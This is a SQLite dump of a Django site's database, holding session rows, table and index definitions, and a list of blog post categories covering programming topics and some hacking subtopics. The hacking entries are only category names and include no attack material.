INSERT INTO "django_session" VALUES('aht4zcu9dz6fia3bks0rjn15ac9wu2sp','.eJxVjMsOwiAQRf-FtSHQ8igu3fsNZJhhpGogKe3K-O_apAvd3nPOfYkI21ri1vMSZxJnocXpd0uAj1x3QHeotyax1XWZk9wVedAur43y83K4fwcFevnWrMKATEGRYW2ADVo0hqdsnRp91jj6IXhLbmJk5SwQaUpeQTY2Ofbi_QH0IDhu:1q5RJx:r4tDNq6TeLsa7pbbV7AdABFvjTouSWV7tIbZZOrll1k','2023-06-17 13:29:29.341305');
INSERT INTO "django_session" VALUES('9eulcwewpy1yjprle036ngqod8qk6aj7','.eJxVjMsOwiAQRf-FtSHQ8igu3fsNZJhhpGogKe3K-O_apAvd3nPOfYkI21ri1vMSZxJnocXpd0uAj1x3QHeotyax1XWZk9wVedAur43y83K4fwcFevnWrMKATEGRYW2ADVo0hqdsnRp91jj6IXhLbmJk5SwQaUpeQTY2Ofbi_QH0IDhu:1q5RKJ:8lploanPsIwLZ5CE_rTSW94sEiw-YgU3qJ7O7CV5SCM','2023-06-17 13:29:51.870333');
INSERT INTO "django_session" VALUES('2vvoxzl8k8z4jio2p5o3s80hf8hdmde4','.eJxVjMsOwiAQRf-FtSHQ8igu3fsNZJhhpGogKe3K-O_apAvd3nPOfYkI21ri1vMSZxJnocXpd0uAj1x3QHeotyax1XWZk9wVedAur43y83K4fwcFevnWrMKATEGRYW2ADVo0hqdsnRp91jj6IXhLbmJk5SwQaUpeQTY2Ofbi_QH0IDhu:1q5RMI:cotjoo9NxfVkKfdTevdy4uJvPKnpPFb6Lsp9qZSSFQc','2023-06-17 13:31:54.845498');
INSERT INTO "django_session" VALUES('9qutjnyehw3s11ts08fy8y3w7tg5cene','.eJxVjMsOwiAQRf-FtSHQ8igu3fsNZJhhpGogKe3K-O_apAvd3nPOfYkI21ri1vMSZxJnocXpd0uAj1x3QHeotyax1XWZk9wVedAur43y83K4fwcFevnWrMKATEGRYW2ADVo0hqdsnRp91jj6IXhLbmJk5SwQaUpeQTY2Ofbi_QH0IDhu:1q5RMi:kdQOHoB4D68uZCHlALy0bE2StUCDXNMtSVpwLRPPJcw','2023-06-17 13:32:20.412824');
INSERT INTO "django_session" VALUES('ncuhgbikhyew978zkd7pmlbvvkm8s5ao','.eJxVjMsOwiAQRf-FtSHQ8igu3fsNZJhhpGogKe3K-O_apAvd3nPOfYkI21ri1vMSZxJnocXpd0uAj1x3QHeotyax1XWZk9wVedAur43y83K4fwcFevnWrMKATEGRYW2ADVo0hqdsnRp91jj6IXhLbmJk5SwQaUpeQTY2Ofbi_QH0IDhu:1q5RNE:n_h9OgqXwFZNELkW7I4x-KKjbPm8xF_XRransGfLL3o','2023-06-17 13:32:52.551781');
INSERT INTO "django_session" VALUES('wllusrlbigkz0rig9m8lfflb0qmoztwb','.eJxVjEEOgjAQRe_StWnAtkPHpXvOQKYzg0VNSSisjHdXEha6_e-9_zIDbWsetqrLMIm5mLM5_W6J-KFlB3Kncpstz2VdpmR3xR602n4WfV4P9-8gU83f2klofESHEaOgb1nFi4MRW-fHQJ2DoMARgBRD4gZcTEyAIyinjpJ5fwDJmDf8:1q5TK1:1SHX8t7qky1phS7wsrAVRqRgPgFilo61oKSusAGy14E','2023-06-17 15:37:41.208562');
INSERT INTO "django_session" VALUES('vou5yh8l6ig79ozgwefllwyyn4gfva2p','.eJxVjEEOgjAQRe_StWnAtkPHpXvOQKYzg0VNSSisjHdXEha6_e-9_zIDbWsetqrLMIm5mLM5_W6J-KFlB3Kncpstz2VdpmR3xR602n4WfV4P9-8gU83f2klofESHEaOgb1nFi4MRW-fHQJ2DoMARgBRD4gZcTEyAIyinjpJ5fwDJmDf8:1q5TNR:BPFDVQRl6axvg8zoxrJABe2ePDSL5mWOpQGAscgFxH0','2023-06-17 15:41:13.550434');
INSERT INTO "django_session" VALUES('yw9q7ip1z4zsdwftd7m7rdokj5ny4f9s','.eJxVjEEOgjAQRe_StWnAtkPHpXvOQKYzg0VNSSisjHdXEha6_e-9_zIDbWsetqrLMIm5mLM5_W6J-KFlB3Kncpstz2VdpmR3xR602n4WfV4P9-8gU83f2klofESHEaOgb1nFi4MRW-fHQJ2DoMARgBRD4gZcTEyAIyinjpJ5fwDJmDf8:1q5TOF:wlKzFGSurKVGvOJFpNPclHGphwmKvheEv7T4ZsDzFvM','2023-06-17 15:42:03.727504');
INSERT INTO "django_session" VALUES('tdw8s4bz0ho9m5wdyl5sq5dp9maiyuj2','.eJxVjEEOgjAQRe_StWnAtkPHpXvOQKYzg0VNSSisjHdXEha6_e-9_zIDbWsetqrLMIm5mLM5_W6J-KFlB3Kncpstz2VdpmR3xR602n4WfV4P9-8gU83f2klofESHEaOgb1nFi4MRW-fHQJ2DoMARgBRD4gZcTEyAIyinjpJ5fwDJmDf8:1q5TOK:Nx1W-EqpiQSdJX3_K53c2S82uHGlxq6NKBY95gLTTEM','2023-06-17 15:42:08.397131');
INSERT INTO "django_session" VALUES('47znncwpm4d375xmvq49c13u50h91z0y','.eJxVjEEOgjAQRe_StWnAtkPHpXvOQKYzg0VNSSisjHdXEha6_e-9_zIDbWsetqrLMIm5mLM5_W6J-KFlB3Kncpstz2VdpmR3xR602n4WfV4P9-8gU83f2klofESHEaOgb1nFi4MRW-fHQJ2DoMARgBRD4gZcTEyAIyinjpJ5fwDJmDf8:1q5TON:VhAxGBHCPRspSy0ioC62BP_ApMj4jTw7rFptvGt-aeA','2023-06-17 15:42:11.392173');
INSERT INTO "django_session" VALUES('jaulrolxd9uulsjm1k9xwzcyrfra32fw','.eJxVjEEOgjAQRe_StWnAtkPHpXvOQKYzg0VNSSisjHdXEha6_e-9_zIDbWsetqrLMIm5mLM5_W6J-KFlB3Kncpstz2VdpmR3xR602n4WfV4P9-8gU83f2klofESHEaOgb1nFi4MRW-fHQJ2DoMARgBRD4gZcTEyAIyinjpJ5fwDJmDf8:1q5TOj:AVozWP_R1GvB7Akb2ghuF9KcqI-4PdvTefr5juIUeJA','2023-06-17 15:42:33.184323');
INSERT INTO "django_session" VALUES('smvrg9ia3mu9vdqf0l98fi0z7zkgbedy','.eJxVjMsKwyAQAP_FcxFfEe2x936D7LprTVsMxOQU-u9FyKG9zgxziAT7VtPeeU0ziauw4vLLEPKL2xD0hPZYZF7ats4oRyJP2-V9IX7fzvZvUKHXsfWBI2jASUEJyoFybioh2uApezbWF44IBAUxW9YhR1ti1IaNJmIWny_xRjjM:1q5TPT:QRszEv6ijyvuO0Tuw4XidN4hFGOrfqIVBS7hb-FPyXQ','2023-06-17 15:43:19.294222');
INSERT INTO "django_session" VALUES('svu2kk15agmyivkj08zy12q37ehnzeqr','.eJxVjEEOgjAQRe_StWnAtkPHpXvOQKYzg0VNSSisjHdXEha6_e-9_zIDbWsetqrLMIm5mLM5_W6J-KFlB3Kncpstz2VdpmR3xR602n4WfV4P9-8gU83f2klofESHEaOgb1nFi4MRW-fHQJ2DoMARgBRD4gZcTEyAIyinjpJ5fwDJmDf8:1q5Tut:PVBE1Oz95uts6T0XJCdzPI72Rep5L4tddTV4elb6_ek','2023-06-17 16:15:47.817737');
INSERT INTO "django_session" VALUES('gri7u4mq8yp6fynvuuhvt0r4sfyxbkfp','.eJxVjEEOgjAQRe_StWnAtkPHpXvOQKYzg0VNSSisjHdXEha6_e-9_zIDbWsetqrLMIm5mLM5_W6J-KFlB3Kncpstz2VdpmR3xR602n4WfV4P9-8gU83f2klofESHEaOgb1nFi4MRW-fHQJ2DoMARgBRD4gZcTEyAIyinjpJ5fwDJmDf8:1q5U24:XpeajDoWQWjJ4rx3ccJsKh2-acB8CDpVvLQf4Oa8jKc','2023-06-17 16:23:12.116068');
INSERT INTO "django_session" VALUES('q7jdr7t1m3kcj60eu5ej3c4cg3pje68m','.eJxVjMEOwiAQRP-FsyEtC0I9eu83kGVZpGogKe3J-O9K0oOeJpn3Zl7C475lvzde_RLFRWhx-u0C0oNLB_GO5VYl1bKtS5BdkQdtcq6Rn9fD_TvI2PJ3rRyDgkSBHIwpOTJGD2ecEC2MEzrDAMkBWsWEPS1oxSqwIeX0oMX7A-UrN6Q:1q5U6F:G4af7s_wIYvRcIs0TYD4PHLVCn7DiHhWwMCqiK2--Ic','2023-06-17 16:27:31.394761');
INSERT INTO "django_session" VALUES('di6e7q11kox4o6pl4t89c0i8vc0q2ccg','.eJxVjEEOgjAQRe_StWnAtkPHpXvOQKYzg0VNSSisjHdXEha6_e-9_zIDbWsetqrLMIm5mLM5_W6J-KFlB3Kncpstz2VdpmR3xR602n4WfV4P9-8gU83f2klofESHEaOgb1nFi4MRW-fHQJ2DoMARgBRD4gZcTEyAIyinjpJ5fwDJmDf8:1q5Uuf:ZI6hZIGfh9XsDjco8DGZR3OZ6-WNSJf3uenMFXLKcYw','2023-06-17 17:19:37.646047');
INSERT INTO "django_session" VALUES('lc1pk8zu27jvtfp5hzxv0dnbgl2lpxhz','.eJxVjEEOgjAQRe_StWnAtkPHpXvOQKYzg0VNSSisjHdXEha6_e-9_zIDbWsetqrLMIm5mLM5_W6J-KFlB3Kncpstz2VdpmR3xR602n4WfV4P9-8gU83f2klofESHEaOgb1nFi4MRW-fHQJ2DoMARgBRD4gZcTEyAIyinjpJ5fwDJmDf8:1q5Uvq:eSDCe7Vdr44jwo17gJIdon3oBKbgXXo77FAO92BvsPc','2023-06-17 17:20:50.242706');
INSERT INTO "django_session" VALUES('1ypov6meejvasoj22xgarr79ioos1y5j','.eJxVjEEOgjAQRe_StWnAtkPHpXvOQKYzg0VNSSisjHdXEha6_e-9_zIDbWsetqrLMIm5mLM5_W6J-KFlB3Kncpstz2VdpmR3xR602n4WfV4P9-8gU83f2klofESHEaOgb1nFi4MRW-fHQJ2DoMARgBRD4gZcTEyAIyinjpJ5fwDJmDf8:1q5UzR:YSMukertrGeMUiiYSs2g2p4RVtmRK49heBxSblxMZpU','2023-06-17 17:24:33.243498');
INSERT INTO "django_session" VALUES('b105f3efc4wbf7z9q826dycso1jirw5d','.eJxVjEEOgjAQRe_StWnAtkPHpXvOQKYzg0VNSSisjHdXEha6_e-9_zIDbWsetqrLMIm5mLM5_W6J-KFlB3Kncpstz2VdpmR3xR602n4WfV4P9-8gU83f2klofESHEaOgb1nFi4MRW-fHQJ2DoMARgBRD4gZcTEyAIyinjpJ5fwDJmDf8:1q5V4G:HSgs_WSi9317yrzj1CRb1LDBgc7RGO_7lKfWmHip0eM','2023-06-17 17:29:32.567694');
INSERT INTO "django_session" VALUES('w5y73xvfcsd811by3w268ofisp8nzpuj','.eJxVjEEOgjAQRe_StWnAtkPHpXvOQKYzg0VNSSisjHdXEha6_e-9_zIDbWsetqrLMIm5mLM5_W6J-KFlB3Kncpstz2VdpmR3xR602n4WfV4P9-8gU83f2klofESHEaOgb1nFi4MRW-fHQJ2DoMARgBRD4gZcTEyAIyinjpJ5fwDJmDf8:1q5VNv:vJfs-7-kYxotvstuzXPWd91D-0m9aD6qeWePU9fzZdg','2023-06-17 17:49:51.487943');
INSERT INTO "django_session" VALUES('3rb08zew5khubtbw06trn03z0s8ovqle','.eJxVjEEOgjAQRe_StWnAtkPHpXvOQKYzg0VNSSisjHdXEha6_e-9_zIDbWsetqrLMIm5mLM5_W6J-KFlB3Kncpstz2VdpmR3xR602n4WfV4P9-8gU83f2klofESHEaOgb1nFi4MRW-fHQJ2DoMARgBRD4gZcTEyAIyinjpJ5fwDJmDf8:1q5VWW:P203OghvLnvjxOGpHyzZJ82lGTHQKNqc7Xg7v1xWwTY','2023-06-17 17:58:44.008216');
INSERT INTO "django_session" VALUES('ltmcssesk42vljqqoy64ak0htxx4fkgb','.eJxVjEEOgjAQRe_StWnAtkPHpXvOQKYzg0VNSSisjHdXEha6_e-9_zIDbWsetqrLMIm5mLM5_W6J-KFlB3Kncpstz2VdpmR3xR602n4WfV4P9-8gU83f2klofESHEaOgb1nFi4MRW-fHQJ2DoMARgBRD4gZcTEyAIyinjpJ5fwDJmDf8:1q5VYh:qKqqKk690Q7ZD7QVE1iZ0oQ0W5AZVAZb2_orT0BZLbY','2023-06-17 18:00:59.670004');
INSERT INTO "django_session" VALUES('lw7z77btigwlbf9nosqn92ousy110phl','.eJxVjEEOgjAQRe_StWnAtkPHpXvOQKYzg0VNSSisjHdXEha6_e-9_zIDbWsetqrLMIm5mLM5_W6J-KFlB3Kncpstz2VdpmR3xR602n4WfV4P9-8gU83f2klofESHEaOgb1nFi4MRW-fHQJ2DoMARgBRD4gZcTEyAIyinjpJ5fwDJmDf8:1q5Vea:0S6oIla9JQmh3BBLoYi0XA3t1BCPvf5-vt_Sefenaig','2023-06-17 18:07:04.875339');
INSERT INTO "django_session" VALUES('pzvge3g18714knfbl5s48xu4591vutb1','.eJxVjEEOgjAQRe_StWnAtkPHpXvOQKYzg0VNSSisjHdXEha6_e-9_zIDbWsetqrLMIm5mLM5_W6J-KFlB3Kncpstz2VdpmR3xR602n4WfV4P9-8gU83f2klofESHEaOgb1nFi4MRW-fHQJ2DoMARgBRD4gZcTEyAIyinjpJ5fwDJmDf8:1q5Veg:JJjePlJjyE-ZZIDZWZspv7KHepFTRU2jZoClamZvGg4','2023-06-17 18:07:10.229043');
INSERT INTO "django_session" VALUES('oggbfoiuf6j5eqpaa291nd0ut9qmyn6j','.eJxVjEEOgjAQRe_StWnAtkPHpXvOQKYzg0VNSSisjHdXEha6_e-9_zIDbWsetqrLMIm5mLM5_W6J-KFlB3Kncpstz2VdpmR3xR602n4WfV4P9-8gU83f2klofESHEaOgb1nFi4MRW-fHQJ2DoMARgBRD4gZcTEyAIyinjpJ5fwDJmDf8:1q5Vei:eJnM7nqQfyT6Ka5KUFzUBMCnomEx5OUd7R4F2MO0uMA','2023-06-17 18:07:12.592753');
INSERT INTO "django_session" VALUES('uhfm9s8s81sihs3ovos25uqnwx7uwil3','.eJxVjEEOgjAQRe_StWnAtkPHpXvOQKYzg0VNSSisjHdXEha6_e-9_zIDbWsetqrLMIm5mLM5_W6J-KFlB3Kncpstz2VdpmR3xR602n4WfV4P9-8gU83f2klofESHEaOgb1nFi4MRW-fHQJ2DoMARgBRD4gZcTEyAIyinjpJ5fwDJmDf8:1q5Vek:d8yMpKvWR4T8KiW6HPJs2fFn1jtSA6hAHzZXq1pWxjE','2023-06-17 18:07:14.772844');
INSERT INTO "django_session" VALUES('6ygfeh6d9iftxf3afq7ixjc6gg1s2z1h','.eJxVjEEOgjAQRe_StWnAtkPHpXvOQKYzg0VNSSisjHdXEha6_e-9_zIDbWsetqrLMIm5mLM5_W6J-KFlB3Kncpstz2VdpmR3xR602n4WfV4P9-8gU83f2klofESHEaOgb1nFi4MRW-fHQJ2DoMARgBRD4gZcTEyAIyinjpJ5fwDJmDf8:1q5VfG:enK3H-xlANOuJ4wCiL94EQ4u-oS5yBVFSbF_6EF_hK0','2023-06-17 18:07:46.879778');
CREATE UNIQUE INDEX "auth_group_permissions_group_id_permission_id_0cd325b0_uniq" ON "auth_group_permissions" ("group_id", "permission_id");
CREATE INDEX IF NOT EXISTS "auth_group_permissions_group_id_b120cbf9" ON "auth_group_permissions" ("group_id");
CREATE INDEX IF NOT EXISTS "auth_group_permissions_permission_id_84c5c92e" ON "auth_group_permissions" ("permission_id");
CREATE UNIQUE INDEX "auth_permission_content_type_id_codename_01ab375a_uniq" ON "auth_permission" ("content_type_id", "codename");
CREATE INDEX IF NOT EXISTS "auth_permission_content_type_id_2f476e4b" ON "auth_permission" ("content_type_id");
CREATE UNIQUE INDEX "auth_user_groups_user_id_group_id_94350c0c_uniq" ON "auth_user_groups" ("user_id", "group_id");
CREATE INDEX IF NOT EXISTS "auth_user_groups_user_id_6a12ed8b" ON "auth_user_groups" ("user_id");
CREATE INDEX IF NOT EXISTS "auth_user_groups_group_id_97559544" ON "auth_user_groups" ("group_id");
CREATE UNIQUE INDEX "auth_user_user_permissions_user_id_permission_id_14a6b632_uniq" ON "auth_user_user_permissions" ("user_id", "permission_id");
CREATE INDEX IF NOT EXISTS "auth_user_user_permissions_user_id_a95ead1b" ON "auth_user_user_permissions" ("user_id");
CREATE INDEX IF NOT EXISTS "auth_user_user_permissions_permission_id_1fbb5f2c" ON "auth_user_user_permissions" ("permission_id");
CREATE INDEX IF NOT EXISTS "django_admin_log_content_type_id_c4bce8eb" ON "django_admin_log" ("content_type_id");
CREATE INDEX IF NOT EXISTS "django_admin_log_user_id_c564eba6" ON "django_admin_log" ("user_id");
CREATE UNIQUE INDEX "django_content_type_app_label_model_76bd3d3b_uniq" ON "django_content_type" ("app_label", "model");
CREATE INDEX IF NOT EXISTS "django_session_expire_date_a5c62663" ON "django_session" ("expire_date");
CREATE INDEX IF NOT EXISTS "sections_category_parent_96fdf671" ON "sections_category" ("parent");
CREATE UNIQUE INDEX "sections_hashtag_post_hashtag_id_post_id_2d6f0c2d_uniq" ON "sections_hashtag_post" ("hashtag_id", "post_id");
CREATE INDEX IF NOT EXISTS "sections_hashtag_post_hashtag_id_7b51c385" ON "sections_hashtag_post" ("hashtag_id");
CREATE INDEX IF NOT EXISTS "sections_hashtag_post_post_id_ea3affd7" ON "sections_hashtag_post" ("post_id");
CREATE INDEX IF NOT EXISTS "sections_post_category_id_96eb7da2" ON "sections_post" ("category_id");
CREATE INDEX IF NOT EXISTS "token_blacklist_outstandingtoken_user_id_83bc629a" ON "token_blacklist_outstandingtoken" ("user_id");
CREATE TABLE IF NOT EXISTS "movies_movie" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "title" varchar(255) NOT NULL, "genre" varchar(255) NOT NULL, "year" varchar(4) NOT NULL, "created_date" datetime NOT NULL, "updated_date" datetime NOT NULL);
CREATE UNIQUE INDEX "auth_group_permissions_group_id_permission_id_0cd325b0_uniq" ON "auth_group_permissions" ("group_id", "permission_id");
CREATE INDEX IF NOT EXISTS "auth_group_permissions_group_id_b120cbf9" ON "auth_group_permissions" ("group_id");
CREATE INDEX IF NOT EXISTS "auth_group_permissions_permission_id_84c5c92e" ON "auth_group_permissions" ("permission_id");
CREATE UNIQUE INDEX "auth_permission_content_type_id_codename_01ab375a_uniq" ON "auth_permission" ("content_type_id", "codename");
CREATE INDEX IF NOT EXISTS "auth_permission_content_type_id_2f476e4b" ON "auth_permission" ("content_type_id");
CREATE UNIQUE INDEX "auth_user_groups_user_id_group_id_94350c0c_uniq" ON "auth_user_groups" ("user_id", "group_id");
CREATE INDEX IF NOT EXISTS "auth_user_groups_user_id_6a12ed8b" ON "auth_user_groups" ("user_id");
CREATE INDEX IF NOT EXISTS "auth_user_groups_group_id_97559544" ON "auth_user_groups" ("group_id");
CREATE UNIQUE INDEX "auth_user_user_permissions_user_id_permission_id_14a6b632_uniq" ON "auth_user_user_permissions" ("user_id", "permission_id");
CREATE INDEX IF NOT EXISTS "auth_user_user_permissions_user_id_a95ead1b" ON "auth_user_user_permissions" ("user_id");
CREATE INDEX IF NOT EXISTS "auth_user_user_permissions_permission_id_1fbb5f2c" ON "auth_user_user_permissions" ("permission_id");
CREATE INDEX IF NOT EXISTS "django_admin_log_content_type_id_c4bce8eb" ON "django_admin_log" ("content_type_id");
CREATE INDEX IF NOT EXISTS "django_admin_log_user_id_c564eba6" ON "django_admin_log" ("user_id");
CREATE UNIQUE INDEX "django_content_type_app_label_model_76bd3d3b_uniq" ON "django_content_type" ("app_label", "model");
CREATE INDEX IF NOT EXISTS "django_session_expire_date_a5c62663" ON "django_session" ("expire_date");
CREATE INDEX IF NOT EXISTS "sections_category_parent_96fdf671" ON "sections_category" ("parent");
CREATE UNIQUE INDEX "sections_hashtag_post_hashtag_id_post_id_2d6f0c2d_uniq" ON "sections_hashtag_post" ("hashtag_id", "post_id");
CREATE INDEX IF NOT EXISTS "sections_hashtag_post_hashtag_id_7b51c385" ON "sections_hashtag_post" ("hashtag_id");
CREATE INDEX IF NOT EXISTS "sections_hashtag_post_post_id_ea3affd7" ON "sections_hashtag_post" ("post_id");
CREATE INDEX IF NOT EXISTS "sections_post_category_id_96eb7da2" ON "sections_post" ("category_id");
CREATE INDEX IF NOT EXISTS "token_blacklist_outstandingtoken_user_id_83bc629a" ON "token_blacklist_outstandingtoken" ("user_id");
CREATE TABLE IF NOT EXISTS "sections_category" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "name" varchar(64) NOT NULL, "slug" varchar(64) NOT NULL UNIQUE, "created_date" datetime NOT NULL, "updated_date" datetime NOT NULL, "parent" bigint NULL REFERENCES "sections_category" ("id") DEFERRABLE INITIALLY DEFERRED);
INSERT INTO "sections_category" VALUES(1,'CodeHelp','codehelp','2023-01-01 20:38:02.461000','2023-01-01 20:38:02.461000',NULL);
INSERT INTO "sections_category" VALUES(2,'docker','docker','2023-01-01 20:38:28.729000','2023-01-01 20:38:28.729000',1);
INSERT INTO "sections_category" VALUES(3,'django','django','2023-01-01 20:40:23.618000','2023-01-01 20:40:23.618000',1);
INSERT INTO "sections_category" VALUES(4,'git','git','2023-01-01 20:41:00.911000','2023-01-01 20:41:00.911000',1);
INSERT INTO "sections_category" VALUES(5,'linox','linox','2023-01-01 20:50:09.229000','2023-01-01 20:50:09.229000',1);
INSERT INTO "sections_category" VALUES(6,'internet','internet','2023-01-01 20:52:46.674000','2023-01-01 20:52:46.674000',1);
INSERT INTO "sections_category" VALUES(7,'react','react','2023-01-01 21:05:14.272000','2023-01-01 21:05:14.272000',1);
INSERT INTO "sections_category" VALUES(8,'redux','redux','2023-01-01 21:05:37.397000','2023-01-01 21:10:13.656000',7);
INSERT INTO "sections_category" VALUES(9,'typescript','typescript','2023-01-01 21:10:45.512000','2023-01-01 21:10:45.512000',7);
INSERT INTO "sections_category" VALUES(10,'router','router','2023-01-01 21:11:23.619000','2023-01-01 21:11:23.619000',7);
INSERT INTO "sections_category" VALUES(11,'hooks','hooks','2023-01-01 21:12:03.985000','2023-01-01 21:12:03.985000',7);
INSERT INTO "sections_category" VALUES(12,'hacking','hacking','2023-01-01 21:13:43.302000','2023-01-05 12:44:58.741000',NULL);
INSERT INTO "sections_category" VALUES(13,'english','english','2023-01-01 21:15:55.752000','2023-01-01 21:15:55.752000',NULL);
INSERT INTO "sections_category" VALUES(14,'vmware','vmware','2023-01-01 21:21:56.476000','2023-01-01 21:27:05.173000',15);
INSERT INTO "sections_category" VALUES(15,'virtualisation','virtualisation','2023-01-01 21:26:48.829000','2023-01-01 21:26:48.829000',1);
INSERT INTO "sections_category" VALUES(16,'virtualBox','virtualBox','2023-01-01 21:27:59.027000','2023-01-01 21:27:59.027000',15);
INSERT INTO "sections_category" VALUES(17,'VS code','vscode','2023-01-01 21:31:12.782000','2023-01-01 21:31:12.782000',1);
INSERT INTO "sections_category" VALUES(18,'snippet react','snippet-react','2023-01-01 21:31:49.919000','2023-01-01 21:31:49.919000',17);
INSERT INTO "sections_category" VALUES(19,'python','python','2023-01-02 17:10:17.481000','2023-01-02 17:10:31.010000',1);
INSERT INTO "sections_category" VALUES(20,'APScheduler','APScheduler','2023-01-02 17:11:26.368000','2023-01-02 17:11:26.368000',19);
INSERT INTO "sections_category" VALUES(21,'network','network','2023-01-05 12:46:32.134000','2023-01-05 12:46:32.134000',12);
INSERT INTO "sections_category" VALUES(22,'gaining_access','gaining_access','2023-01-05 12:47:34.008000','2023-01-05 12:47:34.008000',12);
INSERT INTO "sections_category" VALUES(23,'post_exploitation','post_exploitation','2023-01-05 12:48:58.860000','2023-01-05 12:48:58.860000',12);
INSERT INTO "sections_category" VALUES(24,'website_hacking','website_hacking','2023-01-05 13:30:46.702000','2023-01-05 13:30:46.702000',12);
INSERT INTO "sections_category" VALUES(25,'pre-connection','pre-connection','2023-01-05 19:45:59.298000','2023-01-05 19:45:59.298000',21);
INSERT INTO "sections_category" VALUES(26,'network_access','network_access','2023-01-05 19:53:37.275000','2023-01-05 19:53:37.275000',21);
INSERT INTO "sections_category" VALUES(27,'post-connection','post-connection','2023-01-05 19:57:22.819000','2023-01-05 19:57:22.819000',21);
INSERT INTO "sections_category" VALUES(28,'server_side_attack','server_side_attack','2023-01-13 22:14:13.484000','2023-01-13 22:14:13.484000',22);
INSERT INTO "sections_category" VALUES(29,'client_side_attack','client_side_attack','2023-01-14 20:19:09.117000','2023-01-14 20:19:09.117000',22);
INSERT INTO "sections_category" VALUES(30,'JS','JS','2023-01-25 12:52:27.689000','2023-01-25 12:52:27.690000',1);
INSERT INTO "sections_category" VALUES(31,'parsing','parsing','2023-02-13 09:53:53.017000','2023-02-13 09:53:53.017000',1);
INSERT INTO "sections_category" VALUES(32,'kubernetes','kubernetes','2023-02-19 05:19:39.172000','2023-02-19 05:19:39.172000',1);
INSERT INTO "sections_category" VALUES(33,'DokerSwarm','DokerSwarm','2023-02-24 15:17:50.579000','2023-02-24 15:17:50.579000',1);
CREATE UNIQUE INDEX "auth_group_permissions_group_id_permission_id_0cd325b0_uniq" ON "auth_group_permissions" ("group_id", "permission_id");
CREATE INDEX IF NOT EXISTS "auth_group_permissions_group_id_b120cbf9" ON "auth_group_permissions" ("group_id");
CREATE INDEX IF NOT EXISTS "auth_group_permissions_permission_id_84c5c92e" ON "auth_group_permissions" ("permission_id");
CREATE UNIQUE INDEX "auth_permission_content_type_id_codename_01ab375a_uniq" ON "auth_permission" ("content_type_id", "codename");
CREATE INDEX IF NOT EXISTS "auth_permission_content_type_id_2f476e4b" ON "auth_permission" ("content_type_id");
CREATE UNIQUE INDEX "auth_user_groups_user_id_group_id_94350c0c_uniq" ON "auth_user_groups" ("user_id", "group_id");
CREATE INDEX IF NOT EXISTS "auth_user_groups_user_id_6a12ed8b" ON "auth_user_groups" ("user_id");
CREATE INDEX IF NOT EXISTS "auth_user_groups_group_id_97559544" ON "auth_user_groups" ("group_id");
CREATE UNIQUE INDEX "auth_user_user_permissions_user_id_permission_id_14a6b632_uniq" ON "auth_user_user_permissions" ("user_id", "permission_id");
CREATE INDEX IF NOT EXISTS "auth_user_user_permissions_user_id_a95ead1b" ON "auth_user_user_permissions" ("user_id");
CREATE INDEX IF NOT EXISTS "auth_user_user_permissions_permission_id_1fbb5f2c" ON "auth_user_user_permissions" ("permission_id");
CREATE INDEX IF NOT EXISTS "django_admin_log_content_type_id_c4bce8eb" ON "django_admin_log" ("content_type_id");
CREATE INDEX IF NOT EXISTS "django_admin_log_user_id_c564eba6" ON "django_admin_log" ("user_id");
CREATE UNIQUE INDEX "django_content_type_app_label_model_76bd3d3b_uniq" ON "django_content_type" ("app_label", "model");
CREATE INDEX IF NOT EXISTS "django_session_expire_date_a5c62663" ON "django_session" ("expire_date");
CREATE INDEX IF NOT EXISTS "sections_category_parent_96fdf671" ON "sections_category" ("parent");
CREATE UNIQUE INDEX "sections_hashtag_post_hashtag_id_post_id_2d6f0c2d_uniq" ON "sections_hashtag_post" ("hashtag_id", "post_id");
CREATE INDEX IF NOT EXISTS "sections_hashtag_post_hashtag_id_7b51c385" ON "sections_hashtag_post" ("hashtag_id");
CREATE INDEX IF NOT EXISTS "sections_hashtag_post_post_id_ea3affd7" ON "sections_hashtag_post" ("post_id");
CREATE INDEX IF NOT EXISTS "sections_post_category_id_96eb7da2" ON "sections_post" ("category_id");
CREATE INDEX IF NOT EXISTS "token_blacklist_outstandingtoken_user_id_83bc629a" ON "token_blacklist_outstandingtoken" ("user_id");
CREATE TABLE IF NOT EXISTS "sections_hashtag" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "name" varchar(64) NOT NULL UNIQUE);
CREATE UNIQUE INDEX "auth_group_permissions_group_id_permission_id_0cd325b0_uniq" ON "auth_group_permissions" ("group_id", "permission_id");
CREATE INDEX IF NOT EXISTS "auth_group_permissions_group_id_b120cbf9" ON "auth_group_permissions" ("group_id");
CREATE INDEX IF NOT EXISTS "auth_group_permissions_permission_id_84c5c92e" ON "auth_group_permissions" ("permission_id");
CREATE UNIQUE INDEX "auth_permission_content_type_id_codename_01ab375a_uniq" ON "auth_permission" ("content_type_id", "codename");
CREATE INDEX IF NOT EXISTS "auth_permission_content_type_id_2f476e4b" ON "auth_permission" ("content_type_id");
CREATE UNIQUE INDEX "auth_user_groups_user_id_group_id_94350c0c_uniq" ON "auth_user_groups" ("user_id", "group_id");
CREATE INDEX IF NOT EXISTS "auth_user_groups_user_id_6a12ed8b" ON "auth_user_groups" ("user_id");
CREATE INDEX IF NOT EXISTS "auth_user_groups_group_id_97559544" ON "auth_user_groups" ("group_id");
CREATE UNIQUE INDEX "auth_user_user_permissions_user_id_permission_id_14a6b632_uniq" ON "auth_user_user_permissions" ("user_id", "permission_id");
CREATE INDEX IF NOT EXISTS "auth_user_user_permissions_user_id_a95ead1b" ON "auth_user_user_permissions" ("user_id");
CREATE INDEX IF NOT EXISTS "auth_user_user_permissions_permission_id_1fbb5f2c" ON "auth_user_user_permissions" ("permission_id");
CREATE INDEX IF NOT EXISTS "django_admin_log_content_type_id_c4bce8eb" ON "django_admin_log" ("content_type_id");
CREATE INDEX IF NOT EXISTS "django_admin_log_user_id_c564eba6" ON "django_admin_log" ("user_id");
CREATE UNIQUE INDEX "django_content_type_app_label_model_76bd3d3b_uniq" ON "django_content_type" ("app_label", "model");
CREATE INDEX IF NOT EXISTS "django_session_expire_date_a5c62663" ON "django_session" ("expire_date");
CREATE INDEX IF NOT EXISTS "sections_category_parent_96fdf671" ON "sections_category" ("parent");
CREATE UNIQUE INDEX "sections_hashtag_post_hashtag_id_post_id_2d6f0c2d_uniq" ON "sections_hashtag_post" ("hashtag_id", "post_id");
CREATE INDEX IF NOT EXISTS "sections_hashtag_post_hashtag_id_7b51c385" ON "sections_hashtag_post" ("hashtag_id");
CREATE INDEX IF NOT EXISTS "sections_hashtag_post_post_id_ea3affd7" ON "sections_hashtag_post" ("post_id");
